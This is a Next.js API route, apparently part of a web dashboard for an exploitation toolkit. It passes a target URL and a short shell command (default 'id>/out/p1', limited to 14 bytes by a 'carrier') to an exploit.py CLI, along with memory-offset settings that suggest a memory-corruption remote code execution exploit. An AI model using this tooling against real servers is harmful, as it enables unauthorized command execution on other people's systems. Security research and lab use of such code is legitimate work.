import { NextResponse } from "next/server";
import { fireAndForget, snapshot } from "@/lib/agent-manager";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

/**
 * Run the author's exploit.py CLI verbatim (debugging / baseline flow).
 * Output is streamed into the session log via the agent's `raw` op.
 */
export async function POST(req: Request) {
  let body: Record<string, unknown>;
  try {
    body = (await req.json()) as Record<string, unknown>;
  } catch {
    return NextResponse.json({ error: "invalid JSON body" }, { status: 400 });
  }
  const snap = await snapshot();
  if (!snap.agentRunning) {
    return NextResponse.json(
      { error: "agent daemon unreachable; connect a target first" },
      { status: 409 },
    );
  }
  if (!snap.config?.url) {
    return NextResponse.json({ error: "no target configured" }, { status: 409 });
  }
  const cmd = typeof body.cmd === "string" && body.cmd.trim() ? body.cmd.trim() : "id>/out/p1";
  if (cmd.length > 14) {
    return NextResponse.json(
      { error: "command limited to 14 bytes by the 167-byte carrier" },
      { status: 400 },
    );
  }
  if (snap.mock) {
    try {
      await fireAndForget("exec", { cmd, mode: "resp" });
      return NextResponse.json({ ok: true, note: "mock mode: routed through mock agent" });
    } catch (e) {
      return NextResponse.json(
        { error: e instanceof Error ? e.message : "failed" },
        { status: 502 },
      );
    }
  }
  const args: string[] = ["-u", snap.config.url, "-c", cmd, "--profile", snap.config.profile];
  if (typeof body.fetch === "string" && body.fetch.trim()) {
    args.push("--fetch", body.fetch.trim());
  } else {
    args.push("--proof-file", "");
  }
  if (snap.config.hugeMb) args.push("--huge-mb", String(snap.config.hugeMb));
  if (snap.config.timeout) args.push("--timeout", String(snap.config.timeout));
  if (snap.config.retries) args.push("--retries", String(snap.config.retries));
  if (snap.config.zifOffset) args.push("--zif-offset", snap.config.zifOffset);
  if (snap.config.dtorOffset) args.push("--dtor-offset", snap.config.dtorOffset);
  if (snap.config.htdataOffset) args.push("--htdata-offset", snap.config.htdataOffset);
  try {
    const id = await fireAndForget("raw", { args });
    return NextResponse.json({ ok: true, queued: id, args });
  } catch (e) {
    return NextResponse.json(
      { error: e instanceof Error ? e.message : "failed" },
      { status: 502 },
    );
  }
}
